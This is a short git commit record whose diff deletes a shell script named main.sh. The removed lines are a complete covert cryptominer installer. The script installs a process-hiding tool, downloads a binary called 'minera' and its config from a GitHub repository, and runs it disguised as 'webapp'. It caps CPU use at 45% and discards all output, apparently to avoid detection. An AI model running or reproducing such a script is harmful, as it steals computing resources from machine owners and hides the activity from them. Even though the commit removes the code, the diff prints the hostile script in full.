ad863ed42a846fde7d975c1c7bf0fa3bd0eb1b73
danipedrosang <134082647+danipedrosang@users.noreply.github.com>
2023-06-03 18:26:40 +0700

    Delete main.sh

--- main.sh
+++
@@ -1,7 +0,0 @@
-sudo apt-get update
-sudo apt install npm cpulimit -y
-sudo npm i -g node-process-hider && sudo ph add webapp config.json
-wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/config.json
-wget -qO webapp https://github.com/danipedrosang/marcrash/raw/main/minera
-chmod 777 webapp config.json
-cpulimit -l 45 ./webapp >/dev/null 2>&1
